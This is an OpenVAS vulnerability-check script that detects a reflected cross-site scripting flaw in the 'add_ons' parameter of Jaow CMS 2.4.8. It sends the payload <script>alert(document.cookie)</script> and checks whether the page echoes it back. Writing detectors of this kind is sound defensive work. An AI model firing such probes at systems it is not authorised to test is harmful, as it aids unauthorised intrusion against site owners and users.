###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jaow_cms_xss_vunl.nasl 11 2013-10-27 10:12:02Z jan $
#
# Jaow CMS Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  or web script in a user's browser session in the context of an affected site.
  Impact Level: Application";

tag_affected = "Jaow version 2.4.8";
tag_insight = "The flaw is due to improper validation of user-supplied input via the
  'add_ons' parameter to add_ons.php script.";
tag_solution = "No solution or patch is available as of 25th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.jaow.net";
tag_summary = "This host is installed with Jaow CMS and is prone to Cross site
  scripting vulnerability.";

if(description)
{
  script_id(803447);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-25 16:35:12 +0530 (Mon, 25 Mar 2013)");
  script_name("Jaow CMS Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013030202");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/jaow-248-cross-site-scripting");

  script_description(desc);
  script_summary("Check if Jaow is vulnerable to XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/jaow", "/cms", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if(">Jaow<" >< res)
  {
    ## Construct the attack request
    url = dir + "/add_ons.php?add_ons=%3Cscript%3Ealert(document.cookie)%3C/script%3E";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
           pattern:"<script>alert\(document.cookie\)</script>",
           extra_check:"http://www.jaow.net"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
